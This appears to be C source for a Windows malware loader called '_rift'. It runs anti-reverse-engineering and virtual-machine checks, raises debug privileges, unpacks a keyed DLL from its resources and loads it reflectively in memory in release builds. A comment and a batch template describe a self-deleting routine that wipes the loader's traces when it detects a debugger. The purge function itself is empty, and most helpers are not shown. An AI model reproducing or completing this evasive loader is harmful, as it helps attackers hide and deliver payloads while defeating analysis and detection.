#include "pch.h"
#include "_rift.h"

INT WINAPI wWinMain(
	_In_     HINSTANCE hInstance,
	_In_opt_ HINSTANCE hPrevInstance,
	_In_     PWSTR     pCmdLine,
	_In_     INT       nCmdShow
) {
	UNREFERENCED_PARAMETER(hPrevInstance);
	UNREFERENCED_PARAMETER(nCmdShow);
	g_hmMH = hInstance;
	GetModuleFileNameW(hInstance, g_szMFN, sizeof(g_szMFN) / sizeof(*g_szMFN));
	GetCurrentDirectoryW(sizeof(g_szCD) / sizeof(*g_szCD), g_szCD);
	g_hPH = GetProcessHeap();

#ifndef _DEBUG
	BOOL bRE = fnAntiRE();
#endif
	fnAdjustPrivilege(SE_DEBUG_NAME, TRUE);
	BOOL bVM = fnCheckVMPresent();

	fnInitializeXSR();
	fnOpenConsole();

	SIZE_T nDll;
	PVOID pDll = fnUnpackResource(L"_rift.KEY", IDR_RIFTDLL, &nDll);
	if (!pDll)
		return 0x1;

#ifndef _DEBUG
	// "Reflective" DLL loading will only be used in the release build
	HMEMORYMODULE hDll = MemoryLoadLibrary(pDll, nDll);
	if (!hDll)
		return 0x2;

	pfnDllInit fnDllInit = (pfnDllInit)MemoryGetProcAddress(hDll, "fnDllInit");
	int a = fnDllInit(10);

	MemoryFreeLibrary(hDll);
#else
	HMODULE dhDll = LoadLibraryExW(L"_riftdll.dll", 0, LOAD_LIBRARY_SEARCH_APPLICATION_DIR);
	if (!dhDll)
		return 0x2;

	pfnDllInit fnDllInit = (pfnDllInit)GetProcAddress(dhDll, "fnDllInit");
	int a = fnDllInit(10);

	FreeLibrary(dhDll);
#endif

	HeapFree(g_hPH, 0, pDll);
	return 0;
}

/*	This function basically does what it's called,
	it "cleans" (or better purges) everything it can and tries to destroy
	all traces of it self (the loader and everything else it extracts).
	It should get triggered ( / called) if any fatal error occurs,
	or the loader catches any suspicious activities (e.g. debuggers).  */
const BYTE szSelfDelBat[] = {
	"@echo off\n%s:\n\
	del \"%s\" /f\
	\tif exist \"%s\" (\n\
	\t\tgoto %s\n\t)\n\
	del \"%s\" / f"
};
VOID fnPurge() {

}